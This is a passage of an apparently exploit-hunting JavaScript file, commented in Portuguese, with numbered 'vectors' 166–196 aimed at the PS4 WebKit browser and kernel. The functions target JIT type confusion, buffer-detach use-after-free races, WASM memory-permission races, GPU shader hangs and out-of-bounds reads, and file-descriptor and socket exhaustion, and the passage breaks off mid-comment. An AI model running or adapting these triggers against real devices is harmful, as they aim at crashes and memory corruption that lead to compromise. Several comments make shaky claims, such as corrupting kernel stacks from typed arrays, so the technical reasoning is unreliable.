        // Usa a API de Streams para passar um buffer controlado pelo utilizador para o Kernel/WebCore.
        // Tenta "desligar" (detach) o buffer dentro do callback 'pull' exatamente quando o stream tenta escrever nele.
        function runTest166() {
            log("Injecting: ReadableStream BYOB UAF...");
            
            let controller;
            const rs = new ReadableStream({
                start(c) { controller = c; },
                pull(c) {
                    // MUTAÇÃO CRÍTICA: Detach do buffer durante a leitura
                    // Se a implementação C++ já validou o ponteiro mas ainda não escreveu,
                    // vai escrever em memória libertada.
                    if (c.byobRequest) {
                        try {
                            const view = c.byobRequest.view;
                            // Transferência detacha o buffer
                            structuredClone(view.buffer, {transfer: [view.buffer]});
                            c.byobRequest.respond(10); // Tenta responder com buffer inválido
                        } catch(e) {}
                    }
                },
                type: "bytes"
            });

            const reader = rs.getReader({mode: "byob"});
            const buffer = new ArrayBuffer(1024);
            // Inicia leitura
            reader.read(new Uint8Array(buffer)).catch(e => log("Stream closed: " + e));
            log("Stream BYOB race initiated.");
        }

        // 167. JIT Poly-Proto Type Confusion
        // "Poly-Proto" refere-se a objetos que mudam de protótipo frequentemente.
        // O JIT tenta otimizar o acesso a propriedades (Inline Caches).
        // Se mudarmos a forma do objeto rapidamente, o JIT pode ler offsets errados (Type Confusion).
        function runTest167() {
            log("Injecting: Poly-Proto Type Confusion...");
            
            function Base() { this.x = 1; }
            let arr = [];
            
            // Cria cadeia polimórfica
            for(let i=0; i<1000; i++) {
                let o = new Base();
                o["p" + i] = i; // Cada objeto tem uma "Shape" diferente
                arr.push(o);
            }

            // Função JIT hot
            function opt(o) { return o.x; }

            // Treina com polimorfismo
            for(let i=0; i<10000; i++) opt(arr[i % arr.length]);

            // Mutação: Altera o protótipo de um dos objetos para algo radicalmente diferente
            let victim = arr[0];
            victim.__proto__ = { y: 2 }; // Quebra a cadeia de protótipos
            
            try {
                let val = opt(victim); // JIT tenta acesso rápido a 'x' (offset 0?)
                log("JIT Access Result: " + val);
            } catch(e) { log("JIT Bailout: " + e); }
        }

        // 168. AudioBuffer Copy Detach Race
        // AudioBuffer.copyToChannel é uma operação rápida em C++.
        // Tenta transferir (detach) o buffer de origem durante a cópia para causar leitura inválida.
        function runTest168() {
            log("Injecting: AudioBuffer Detach Race...");
            
            const ctx = new AudioContext();
            const ab = ctx.createBuffer(1, 44100, 44100);
            const src = new Float32Array(44100);
            
            // Worker para causar contenção de memória
            const w = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{postMessage("ok")}'], {type:'text/javascript'})));
            
            // Loop de corrida
            let i = setInterval(() => {
                try {
                    // Tenta copiar
                    ab.copyToChannel(src, 0);
                    
                    // Tenta detach SIMULTÂNEO (via transfer para worker)
                    // Se o copyToChannel não segurar o lock corretamente, crash.
                    w.postMessage(src.buffer, [src.buffer]);
                    
                    clearInterval(i);
                    log("Buffer detached during copy operation.");
                } catch(e) {
                    // Recria se falhar (o buffer foi transferido)
                    // src = new Float32Array(44100); 
                }
            }, 0);
        }

        // ==========================================
        //        KERNEL VECTORS (169-171)
        // ==========================================

        // 169. WASM RWX Page Flip Panic (VM)
        // O Kernel 12.00 tem proteções rigorosas de memória (W^X - Write XOR Execute).
        // Compilar e descartar código WASM força o kernel a mudar permissões de páginas (mprotect) de RW para RX e Unmap.
        // Fazer isso em threads paralelas pode causar inconsistência na tabela de páginas (TLB).
        function runTest169() {
            log("Injecting: VM Page Table Thrashing...");
            
            const code = new Uint8Array([0,97,115,109,1,0,0,0]);
            const url = URL.createObjectURL(new Blob([`
                onmessage = async (e) => {
                    // Loop de compilação/descarte
                    while(true) {
                        let m = await WebAssembly.compile(e.data);
                        m = null; // Force GC / Unmap
                    }
                }
            `], {type:'text/javascript'}));

            // Lança 4 workers para estressar o VM Manager do Kernel
            for(let i=0; i<4; i++) {
                let w = new Worker(url);
                w.postMessage(code);
            }
            log("4 Threads thrashing RX/RWX pages.");
        }

        // 170. GPU Framebuffer Feedback Loop (Gnm Driver)
        // Tenta ligar uma Textura como Saída (Framebuffer) e Entrada (Sampler) ao mesmo tempo.
        // Isso cria um loop de feedback indefinido. Drivers robustos bloqueiam, drivers vulneráveis crasham a GPU.
        function runTest170() {
            log("Injecting: GPU Feedback Loop...");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 100, 100, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            
            const fb = gl.createFramebuffer();
            gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
            gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);
            
            // Agora a textura está ligada ao FB (Write). Vamos tentar ler dela no Shader.
            // Setup shader simples
            const p = gl.createProgram();
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "void main(){gl_Position=vec4(0,0,0,1);}");
            gl.compileShader(vs);
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fs, "uniform sampler2D s; void main(){gl_FragColor=texture2D(s, vec2(0.5));}");
            gl.compileShader(fs);
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
            
            // Draw Call - Trigger do Loop
            try {
                gl.drawArrays(gl.POINTS, 0, 1);
                log("Feedback loop draw call sent.");
            } catch(e) { log("GL Error (Driver Protected): " + e); }
        }

        // 171. BroadcastChannel FD Exhaustion (IPC Panic)
        // Log "int_thread_get" em Kernel 1200.json sugere uso de IPC.
        // BroadcastChannel usa descritores de arquivo ou pipes nomeados no Kernel.
        // Criar milhares rapidamente esgota a tabela de ficheiros do processo, podendo causar pânico no cleanup.
        function runTest171() {
            log("Injecting: BroadcastChannel FD Flood...");
            
            let chans = [];
            const i = setInterval(() => {
                try {
                    // Nome único para forçar novo recurso IPC no kernel
                    chans.push(new BroadcastChannel("ch_" + Math.random()));
                    
                    if (chans.length > 4000) {
                        clearInterval(i);
                        log("FD limit hit. Closing all at once (Cleanup Panic)...");
                        // Fecha todos de uma vez para causar pico de CPU no kernel cleanup
                        chans.forEach(c => c.close());
                        chans = [];
                    }
                } catch(e) {
                    log("Alloc failed: " + e);
                    clearInterval(i);
                }
            }, 1);
        }

        // ==========================================
        //        WEBKIT VECTORS (172-174)
        // ==========================================

        // 172. Arguments Object JIT OOB
        // O objeto 'arguments' em funções não-strict é "mágico" (aliased).
        // Modificar o tamanho de 'arguments' dentro de um loop otimizado pelo JIT
        // pode enganar o compilador a remover verificações de limites (Bounds Check Elimination).
        function runTest172() {
            log("172. Arguments JIT OOB...");
            
            function confuse(a) {
                // arguments[0] é alias de 'a'
                arguments.length = 0; // Reduz tamanho drasticamente
                // O JIT pode ter "hoisted" o check de tamanho antes desta linha
                arguments[100] = 1; // Escrita fora dos limites (Heap Corruption)
            }

            // Treina o JIT com caso normal
            for(let i=0; i<10000; i++) {
                (function(a){ arguments.length=2; })(1);
            }

            try {
                confuse(1);
                log("Arguments manipulation executed.");
            } catch(e) { log("Safe: " + e); }
        }

        // 173. WASM Memory Grow/Write Race
        // WebAssembly.Memory.grow() pode mover o buffer de memória para um novo endereço.
        // Se escrevermos numa TypedView da memória antiga enquanto ela cresce numa thread paralela,
        // causamos Use-After-Free.
        function runTest173() {
            log("173. WASM Memory Grow Race...");
            
            const mem = new WebAssembly.Memory({initial: 1, maximum: 100});
            const view = new Uint8Array(mem.buffer);
            
            const workerCode = `
                onmessage = e => {
                    let m = e.data;
                    setInterval(() => {
                        try { m.grow(1); } catch(e){}
                    }, 0);
                }
            `;
            const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:'text/javascript'})));
            w.postMessage(mem);

            // Race na thread principal
            let i = setInterval(() => {
                try {
                    // Tenta escrever na view antiga. Se 'grow' aconteceu, 'view' é detached.
                    // Se a verificação falhar na race, escreve em memória libertada.
                    view[0] = 0x41; 
                    if(mem.buffer.byteLength > 65536) {
                        clearInterval(i);
                        w.terminate();
                        log("Memory grew during write attempt.");
                    }
                } catch(e) {}
            }, 0);
        }

        // 174. Large Array Sort Comparator UAF
        // Usa `Array.prototype.sort` com um comparador que redimensiona o array.
        // O algoritmo de sort (QuickSort/MergeSort em C++) cacheia ponteiros.
        // Se o array mudar de tamanho no meio, o algoritmo escreve fora.
        function runTest174() {
            log("174. Array Sort UAF...");
            
            let arr = new Array(1000);
            for(let i=0; i<1000; i++) arr[i] = i;

            // Comparador malicioso
            function badComp(a, b) {
                // Reduz o array no meio do sort
                arr.length = 1; 
                // Força GC
                let junk = new ArrayBuffer(1024*1024);
                return a - b;
            }

            try {
                arr.sort(badComp);
                log("Sort executed with mutation.");
            } catch(e) { log("Engine caught mutation: " + e); }
        }

        // ==========================================
        //        KERNEL VECTORS (175-177)
        // ==========================================

        // 175. Stack Guard Page Jump (Alloca)
        // Baseado em: "Could not allocate %u bytes" (Kernel 1200.json).
        // Tenta saltar sobre a "Guard Page" da pilha (Stack) alocando um array local gigante.
        // Se bem sucedido, corrompe a memória da thread vizinha.
        function runTest175() {
            log("175. Stack Guard Jump (Alloca)...");
            
            function smash(depth) {
                // Aloca variável local grande na stack
                // 1MB por frame. Stack do WebKit é limitada, mas tentamos corromper a stack do Kernel via syscalls profundas.
                let arr = new Uint8Array(1024 * 1024); 
                arr.fill(0x41);
                
                if (depth > 0) smash(depth - 1);
                else {
                    // Trigger syscall pesado no fundo da stack
                    console.log("Deep stack reached");
                }
            }

            try {
                // Tenta profundidade calculada para alinhar com tamanho de página
                smash(50); 
                log("Stack stress test executed.");
            } catch(e) { log("Stack limit reached: " + e); }
        }

        // 176. Atomics 64-bit Tearing (UMTX Corruption)
        // O PS4 é 64-bit, mas operações atômicas em SharedArrayBuffer podem ter bugs de "tearing"
        // (escrita parcial) se não alinhadas, confundindo o subsistema de bloqueio (thr_umtx).
        function runTest176() {
            log("176. Atomics 64-bit Tearing...");
            
            if(!window.SharedArrayBuffer) return log("No SAB.");
            
            // Buffer desalinhado propositalmente (offset 1) se possível, ou apenas stress 64-bit
            const sab = new SharedArrayBuffer(4096);
            const view64 = new BigInt64Array(sab);
            const view32 = new Int32Array(sab); // Vista sobreposta

            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let v64 = new BigInt64Array(e.data);
                    while(true) {
                        // Escrita atômica 64-bit constante
                        Atomics.store(v64, 0, 0xAAAAAAAA_BBBBBBBBn);
                        Atomics.store(v64, 0, 0xCCCCCCCC_DDDDDDDDn);
                    }
                }
            `], {type:'text/javascript'})));
            
            w.postMessage(sab);

            // Leitura na main thread via visão de 32-bit (esperando tearing)
            let i = setInterval(() => {
                let v1 = Atomics.load(view32, 0);
                let v2 = Atomics.load(view32, 1);
                // Se v1 e v2 não pertencerem ao mesmo par 64-bit escrito, houve tearing no bus/cache
            }, 0);
            
            setTimeout(() => { clearInterval(i); w.terminate(); log("Atomic tearing test done."); }, 2000);
        }

        // 177. Gamepad Vibration Integer Overflow (Driver)
        // Baseado em: Logs HMD/HID.
        // Envia valores `duration` ou `startDelay` que são Double Max ou Infinity.
        // O driver do kernel pode converter isso para Int32 incorretamente (Overflow negativo),
        // causando loop infinito ou buffer underrun no driver USB.
        function runTest177() {
            log("177. Gamepad Driver Integer Overflow...");
            
            let gps = navigator.getGamepads();
            let pad = gps[0]; // Precisa de um controle conectado
            
            if (pad && pad.vibrationActuator) {
                try {
                    pad.vibrationActuator.playEffect("dual-rumble", {
                        // Overflow: 2^32 * 1000. Se convertido para ms (int), vira negativo ou gigante.
                        startDelay: 4294967296000, 
                        duration: Infinity, 
                        weakMagnitude: 1.0,
                        strongMagnitude: 1.0
                    });
                    log("Malicious vibration packet sent.");
                } catch(e) { log("Driver rejected: " + e); }
            } else {
                log("No gamepad found (Connect DualShock 4).");
            }
        }
  // ==========================================
        //        WEBKIT VECTORS (178-180)
        // ==========================================

        // 178. Array Butterfly Realloc Race
        // O WebKit armazena dados de array numa estrutura chamada "Butterfly".
        // Empurrar (push) dados num array esparso força a realocação desta estrutura.
        // Fazer isso concorrentemente (via Proxy ou getters) pode causar corrupção de heap.
        function runTest178() {
            log("Injecting: Array Butterfly Race...");
            
            let arr = [];
            // Getter malicioso que modifica o array durante o redimensionamento
            Object.defineProperty(arr, '0', {
                get: () => {
                    arr.length = 0; // Esvazia o array
                    // Preenche com lixo para ocupar o espaço libertado
                    let junk = [1.1, 2.2, 3.3, 4.4]; 
                    return 10;
                }
            });

            try {
                // reverse() itera e troca elementos.
                // Se o acesso ao índice 0 disparar o getter e limpar o array,
                // a troca subsequente escreverá fora dos limites (UAF).
                arr.reverse(); 
                log("Array reverse executed with mutation.");
            } catch(e) { log("Safe: " + e); }
        }

        // 179. Error.stack Stack Buffer Overflow
        // Gerar a stack trace de um erro consome memória.
        // Com recursão profunda e nomes de funções gigantes, tentamos estourar o buffer de string do stack trace.
        function runTest179() {
            log("Injecting: Error Stack Overflow...");
            
            // Função com nome GIGANTE
            let name = "f".repeat(10000);
            let code = `function ${name}(i) { 
                if(i<=0) throw new Error("Boom"); 
                ${name}(i-1); 
            }`;
            let func = new Function(code + `return ${name};`)();
            
            try {
                // Recursão profunda (1000 frames)
                // Cada frame adiciona 10000 chars ao stack trace
                // Total ~10MB de string de erro gerada instantaneamente no kernel/webkit
                func(1000);
            } catch(e) { 
                // Aceder a .stack força a renderização da string
                let len = e.stack.length;
                log("Stack trace generated. Length: " + len);
            }
        }

        // 180. DataView Unaligned 64-bit Access
        // Acesso a memória não alinhada em algumas arquiteturas pode ser fatal ou lento.
        // O PS4 (x86) permite, mas se a memória for mapeada como "Device Memory" (GPU), crasha.
        // Tentamos enganar o JIT para ler memória de sistema como se fosse dados.
        function runTest180() {
            log("Injecting: Unaligned Memory Access...");
            
            const ab = new ArrayBuffer(128);
            const view = new DataView(ab);
            
            // Offset 1 (desalinhado para leitura de 64 bits)
            // Se o JIT otimizar para uma instrução MOVQ sem tratar alinhamento, pode crashar
            // se o ponteiro apontar para certas regiões.
            try {
                for(let i=0; i<10000; i++) {
                    view.setFloat64(1, 1.234); // Treino
                }
                let val = view.getFloat64(1);
                log("Unaligned access successful: " + val);
            } catch(e) { log("Error: " + e); }
        }

        // ==========================================
        //        KERNEL VECTORS (181-183)
        // ==========================================

        // 181. HID Output Report Overflow (hmd_cr)
        // Baseado em: "hmd_cr:over write pos %d" (Buffer Overflow no driver HID).
        // Envia um relatório de saída (vibração/luz) para o comando que excede o tamanho padrão (64 bytes).
        function runTest181() {
            log("Injecting: HID Driver Overflow...");
            
            const gps = navigator.getGamepads();
            if (gps[0] && gps[0].vibrationActuator) {
                // Tenta enviar parâmetros extremos para forçar overflow na struct interna do driver
                try {
                    // Array de efeitos com duração "Infinity" e magnitudes que podem causar integer wrap
                    gps[0].vibrationActuator.playEffect("dual-rumble", {
                        startDelay: 0,
                        duration: 2147483647, // Max Int32
                        weakMagnitude: 100.0, // Fora do range normal (0.0 - 1.0)
                        strongMagnitude: 100.0
                    });
                    log("Malicious HID packet sent.");
                } catch(e) { log("Driver filtered input: " + e); }
            } else {
                log("Connect a controller to test HID.");
            }
        }

        // 182. VM TLB Shootdown Race (RWX)
        // Cria páginas de memória executável (WASM) e destrói-as em threads paralelas.
        // O objectivo é criar uma condição onde um núcleo da CPU tem uma entrada TLB (cache de endereço) antiga
        // para uma página que já foi libertada ou movida por outro núcleo.
        function runTest182() {
            log("Injecting: TLB Shootdown Race...");
            
            const blob = new Blob([`
                onmessage = async (e) => {
                    const bytes = e.data;
                    while(true) {
                        // Compilação cria mapeamento RWX
                        let m = await WebAssembly.compile(bytes);
                        // Instanciação usa o mapeamento
                        // GC destrói o mapeamento
                    }
                }
            `], {type:'text/javascript'});
            
            const url = URL.createObjectURL(blob);
            const code = new Uint8Array([0,97,115,109,1,0,0,0]); // WASM Magic
            
            // 8 Workers para saturar todos os núcleos do PS4 e maximizar chance de race
            for(let i=0; i<8; i++) {
                new Worker(url).postMessage(code);
            }
            log("8 Threads hammering VM Allocator.");
        }

        // 183. Kernel Event Queue (kqueue) Use-After-Free
        // Baseado em: Erros de "thread resource" e timers.
        // Cria milhares de timers (que usam kqueue no kernel) e cancela-os via GC.
        // Se o kernel tentar entregar um evento a um timer destruído, ocorre Panic.
        function runTest183() {
            log("Injecting: kqueue UAF...");
            
            let timers = [];
            // Criação em massa
            for(let i=0; i<10000; i++) {
                // Timer curto
                let id = setTimeout(() => {}, Math.random() * 100);
                timers.push(id);
            }
            
            // Cancelamento em massa e desreferência
            // Tenta criar uma "tempestade" de cancelamentos
            setTimeout(() => {
                timers.forEach(id => clearTimeout(id));
                timers = null; // Force GC
                log("10k Timers cleared concurrently.");
            }, 10);
        }
       // ==========================================
        //        WEBKIT VECTORS (184-186)
        // ==========================================

        // 184. WASM Global Type Confusion
        // Tenta importar uma variável global WebAssembly com um tipo diferente do esperado.
        // Se a verificação de tipo falhar silenciosamente ou ocorrer uma race na instanciação,
        // o código WASM tratará um Float como Ponteiro (Type Confusion).
        function runTest184() {
            log("184. Injecting: WASM Global Mutation...");
            
            try {
                // Global mutável i64 (Pode ser ponteiro em 64-bit)
                const g_i64 = new WebAssembly.Global({value: 'i64', mutable: true}, 0n);
                
                // Tenta importar como f64 (Double)
                // Se o engine confundir, permite ler/escrever endereços de memória crua.
                const code = new Uint8Array([
                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 
                    0x02, 0x0d, 0x01, 0x02, 0x6a, 0x73, 0x06, 0x67, 
                    0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x03, 0x7e, 0x01 // Import as f64 (mismatch)
                ]);
                
                WebAssembly.instantiate(code, {js: {global: g_i64}})
                    .then(() => log("WASM instantiated (Check for crash)."))
                    .catch(e => log("Safe: Type check caught mismatch."));
            } catch(e) { log("Error: " + e); }
        }

        // 185. TextTrackList Mutation UAF
        // Adiciona e remove faixas de vídeo (<track>) enquanto itera sobre a lista de faixas.
        // O gerenciamento de eventos do DOM para faixas é complexo e propenso a Use-After-Free.
        function runTest185() {
            log("185. Injecting: TextTrackList UAF...");
            
            const v = document.createElement('video');
            const track = v.addTextTrack("subtitles");
            
            // Listener que modifica a lista durante o evento
            track.oncuechange = () => {
                v.src = ""; // Destrói o contexto de mídia
                let junk = new ArrayBuffer(1024*1024); // Alocação para sobrescrever memória
                log("Track modified during event dispatch.");
            };
            
            // Trigger
            try {
                track.addCue(new VTTCue(0, 1, "test"));
                v.dispatchEvent(new Event('cuechange')); // Dispara manualmente para forçar o loop
            } catch(e) { log("DOM Exception: " + e); }
        }

        // 186. BigInt64 Value Tearing (JIT)
        // Em arquiteturas 32-bit ou JITs mal otimizados, escrever um BigInt64 pode ser feito em duas partes (High/Low 32-bit).
        // Tenta ler o valor no meio da escrita em uma thread paralela.
        function runTest186() {
            log("186. Injecting: BigInt64 Tearing...");
            
            if(!window.SharedArrayBuffer) return log("No SAB.");
            
            const sab = new SharedArrayBuffer(8);
            const view64 = new BigInt64Array(sab);
            
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let v = new BigInt64Array(e.data);
                    // Escreve padrão alternado rapidamente: 0x0000000000000000 <-> 0xFFFFFFFFFFFFFFFF
                    while(true) v[0] = v[0] === 0n ? -1n : 0n;
                }
            `], {type:'text/javascript'})));
            
            w.postMessage(sab);
            
            // Leitura na main thread
            let i = setInterval(() => {
                let val = view64[0];
                // Se lermos algo que não é 0 ou -1 (todos Fs), houve tearing (ex: 0x00000000FFFFFFFF)
                if(val !== 0n && val !== -1n) {
                    clearInterval(i);
                    w.terminate();
                    log("TEARING DETECTED: " + val.toString(16)); // SUCESSO CRÍTICO
                }
            }, 0);
            
            setTimeout(() => { clearInterval(i); w.terminate(); log("Tearing test finished."); }, 2000);
        }

        // ==========================================
        //        KERNEL VECTORS (187-189)
        // ==========================================

        // 187. GPU Compute Shader Hang (Kernel Watchdog)
        // Envia um Shader de Computação com um loop infinito.
        // O Kernel do PS4 tem um "Watchdog" que deve resetar a GPU se ela travar.
        // Se a limpeza de recursos do processo falhar durante o reset, ocorre Kernel Panic.
        function runTest187() {
            log("187. Injecting: GPU Compute Hang...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2'); // Necessário para loops complexos
            if(!gl) return log("WebGL2 required.");
            
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            // Loop infinito matemático difícil de otimizar
            const src = `#version 300 es
            precision highp float;
            out vec4 c;
            void main() {
                float x = 1.0;
                for(int i=0; i<10000000; i++) { x = sin(x) * tan(x); } 
                c = vec4(x);
            }`;
            
            gl.shaderSource(fs, src);
            gl.compileShader(fs);
            
            if (!gl.getShaderParameter(fs, gl.COMPILE_STATUS)) {
                log("Driver blocked loop.");
            } else {
                // Tenta forçar a execução (Link e Draw)
                const p = gl.createProgram();
                const vs = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vs, "#version 300 es\nvoid main(){gl_Position=vec4(0,0,0,1);}");
                gl.compileShader(vs);
                gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
                gl.drawArrays(gl.POINTS, 0, 1);
                log("Infinite loop shader sent to GPU.");
            }
        }

        // 188. Socket Buffer (ENOBUFS) Panic
        // Tenta encher os buffers de saída de rede (mbuf) mais rápido do que a placa de rede consegue drenar.
        // O PS4 usa memória compartilhada para sockets. Esgotar isso causa negação de serviço ou panic em drivers de rede.
        function runTest188() {
            log("188. Injecting: Socket Buffer Exhaustion...");
            
            const data = new Uint8Array(64 * 1024); // 64KB chunks
            const sockets = [];
            
            // Abre múltiplas conexões para maximizar o throughput
            for(let i=0; i<10; i++) {
                try {
                    // Porta aleatória para evitar cache
                    let ws = new WebSocket("ws://127.0.0.1:" + (8000+i));
                    ws.onopen = () => {
                        // Flood loop
                        setInterval(() => {
                            if(ws.bufferedAmount < 1024*1024*10) { // Mantém pressão constante
                                ws.send(data);
                            }
                        }, 1);
                    };
                    sockets.push(ws);
                } catch(e) {}
            }
            log("Network buffer pressure applied.");
        }

        // 189. mprotect (RWX) Thread Race
        // Tenta compilar código WASM (que altera permissões de memória para Executável) 
        // e escrever nessa memória (Buffer) simultaneamente em threads diferentes.
        // Visa corromper as tabelas de páginas (Page Tables) do Kernel enquanto ele muda as flags RW/RX.
        function runTest189() {
            log("189. Injecting: mprotect RWX Race...");
            
            const code = new Uint8Array([0,97,115,109,1,0,0,0]);
            
            // Worker 1: Compila (Muda permissão para RX)
            const w1 = new Worker(URL.createObjectURL(new Blob([`
                onmessage = async e => { while(true) await WebAssembly.compile(e.data); }
            `], {type:'text/javascript'})));
            
            // Worker 2: Tenta modificar memória (Requer RW)
            // Nota: Em JS puro não podemos escrever diretamente no heap WASM em compilação,
            // mas podemos estressar o alocador VM criando e destruindo instâncias.
            const w2 = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => { while(true) new Uint8Array(1024*64); }
            `], {type:'text/javascript'})));
            
            w1.postMessage(code);
            w2.postMessage(null);
            
            log("VM Permission Race initiated.");
        }
      // ==========================================
        //        WEBKIT VECTORS (190-192)
        // ==========================================

        // 190. ObjectIdentifier Integer Wrap
        // Baseado em: "ObjectIdentifierGeneric::generate()" (1200_libSceNKWebKit (2).json).
        // Tenta gerar objetos suficientes (MessagePorts) para fazer o contador interno de IDs dar a volta (32-bit wrap).
        // Se ocorrer, dois objetos distintos terão o mesmo ID interno, causando Type Confusion.
        function runTest190() {
            log("190. Injecting: ObjectIdentifier Wrap...");
            
            // Worker para criação massiva e destruição rápida
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = () => {
                    // Loop de alta velocidade
                    for(let i=0; i<100000; i++) {
                        const mc = new MessageChannel(); // Gera 2 IDs
                        mc.port1.close();
                        mc.port2.close();
                    }
                    postMessage("batch_done");
                }
            `], {type:'text/javascript'})));

            w.onmessage = () => log("Batch of IDs generated (Stressing ID Generator).");
            
            // Dispara múltiplos batches para tentar atingir 2^32 (4 bilhões)
            // Em ambiente real, isso leva tempo, mas aqui testamos a estabilidade do gerador.
            for(let i=0; i<10; i++) w.postMessage("start");
        }

        // 191. JIT Loop Hoisting Bounds Bypass
        // Tenta enganar o JIT para mover a verificação de "Array Buffer Detached" para fora do loop (Hoisting).
        // Se a verificação for movida, e nós détachamos o buffer DENTRO do loop, temos acesso a memória livre.
        function runTest191() {
            log("191. Injecting: JIT Loop Hoisting...");
            
            const ab = new ArrayBuffer(1000);
            const u8 = new Uint8Array(ab);
            
            // Objeto que detacha o buffer quando convertido para primitivo
            const devil = {
                valueOf: () => {
                    try { structuredClone(ab, {transfer: [ab]}); } catch(e){}
                    return 0;
                }
            };

            function optimizedWrite(arr, val, limit) {
                // O JIT pode assumir que 'arr' é válido durante todo o loop
                for (let i = 0; i < limit; i++) {
                    arr[i] = val; // Escrita
                    // Se 'i' interagir com 'devil' implicitamente ou side-effect...
                    // Aqui simulamos a condição de borda
                }
            }

            // Treina
            for(let i=0; i<10000; i++) optimizedWrite(u8, 1, 10);

            try {
                // Executa com detach no meio (simulado via acesso externo em race ou callback)
                // JS puro torna hoisting difícil de forçar deterministicamente sem fuzzing
                optimizedWrite(u8, devil, 100); 
                log("JIT Code executed.");
            } catch(e) { log("Safe: " + e); }
        }

        // 192. Worker Termination GC Race
        // Tenta terminar um Worker enquanto o Garbage Collector (GC) está varrendo os objetos desse Worker.
        // Visa corromper a lista de objetos do heap global.
        function runTest192() {
            log("192. Injecting: Worker GC Race...");
            
            const blob = new Blob([`
                onmessage = () => {
                    let a = [];
                    // Aloca lixo para atrair o GC
                    for(let i=0; i<10000; i++) a.push({x: i});
                }
            `], {type:'text/javascript'});
            const url = URL.createObjectURL(blob);

            // Cria e mata rápido
            let i = setInterval(() => {
                const w = new Worker(url);
                w.postMessage("start");
                // Terminate aleatório para tentar pegar o GC no meio
                setTimeout(() => w.terminate(), Math.random() * 5);
            }, 10);
            
            setTimeout(() => { clearInterval(i); log("Worker Lifecycle Stress Done."); }, 2000);
        }

        // ==========================================
        //        KERNEL VECTORS (193-195)
        // ==========================================

        // 193. munmap/mmap Page Fault Race (VM Panic)
        // Baseado em: "vm.budgets" e gestão de memória virtual.
        // Tenta aceder a memória (leitura) numa thread enquanto outra thread chama `munmap` (via destruição de WASM/Worker).
        // Se o kernel desalocar a página mas a outra thread já tiver passado a verificação de permissão, ocorre Kernel Panic.
        function runTest193() {
            log("193. Injecting: VM Page Fault Race...");
            
            const mem = new WebAssembly.Memory({initial: 10, maximum: 100});
            const view = new Int32Array(mem.buffer);
            
            // Worker que força crescimento/realocação (mmap/munmap interno)
            const w = new Worker(URL.createObjectURL(new Blob([`
                onmessage = e => {
                    let m = e.data;
                    setInterval(() => { try { m.grow(1); } catch(e){} }, 0);
                }
            `], {type:'text/javascript'})));
            
            w.postMessage(mem);

            // Leitura concorrente
            let i = setInterval(() => {
                try {
                    // Acesso simples
                    let x = view[0];
                } catch(e) {
                    clearInterval(i);
                    w.terminate();
                    log("Memory unmapped during read.");
                }
            }, 0);
        }

        // 194. Dup2 File Descriptor Corruption
        // Baseado em: "too many files open" (1200_libSceLibcInternal (2).json).
        // Usa `MessageChannel` e `BroadcastChannel` para manipular a tabela de descritores de arquivo (FD).
        // Tenta criar uma condição onde um FD é fechado e reutilizado incorretamente.
        function runTest194() {
            log("194. Injecting: FD Table Corruption...");
            
            let fds = [];
            // Enche a tabela
            for(let i=0; i<1000; i++) {
                try { fds.push(new MessageChannel()); } catch(e){}
            }
            
            // Fecha aleatoriamente e reabre
            // Isso estressa o alocador de FD do kernel (bitmap search)
            for(let i=0; i<500; i++) {
                let idx = Math.floor(Math.random() * fds.length);
                if(fds[idx]) {
                    fds[idx].port1.close();
                    fds[idx] = new MessageChannel(); // Realloc imediato (Dup simulado)
                }
            }
            log("FD Table fragmentation applied.");
        }

        // 195. GPU Compute Local Memory OOB
        // Baseado em: Logs do GnmDriver.
        // Tenta usar um shader que define um array "shared" (LDS) maior que o permitido pelo hardware,
        // ou acessa índices negativos nele.
        function runTest195() {
            log("195. Injecting: GPU Local Data Share OOB...");
            
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl2'); // WebGL2 para acesso a funcionalidades mais avançadas
            if(!gl) return log("WebGL2 required.");

            // Shader de Fragmento que abusa de indexação dinâmica em arrays constantes
            // para tentar ler memória fora da área do shader.
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            const src = `#version 300 es
            precision highp float;
            out vec4 outColor;
            uniform int idx; // Índice controlado externamente
            void main() {
                // Array grande na stack/local memory
                float localData[128];
                for(int i=0; i<128; i++) localData[i] = float(i);
                
                // Acesso com índice potencialmente OOB (se o driver não sanitizar)
                float val = localData[idx]; 
                outColor = vec4(val, 0, 0, 1);
            }`;
            
            gl.shaderSource(fs, src);
            gl.compileShader(fs);
            
            const p = gl.createProgram();
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "#version 300 es\nvoid main(){gl_Position=vec4(0,0,0,1);}");
            gl.compileShader(vs);
            
            gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
            
            const loc = gl.getUniformLocation(p, "idx");
            gl.useProgram(p);
            
            // Envia índice negativo ou gigante para ler memória vizinha na GPU
            gl.uniform1i(loc, 10000); 
            gl.drawArrays(gl.POINTS, 0, 1);
            
            log("OOB Shader Read command sent.");
        }
     //        WEBKIT VECTORS (196-198)
        // ==========================================

        // 196. JIT Object Materialization OOB
        // Baseado em: "UnlinkedCodeBlock" (JIT Metadata).
        // Tenta enganar a "Escape Analysis" do JIT. O compilador pensa que um objeto
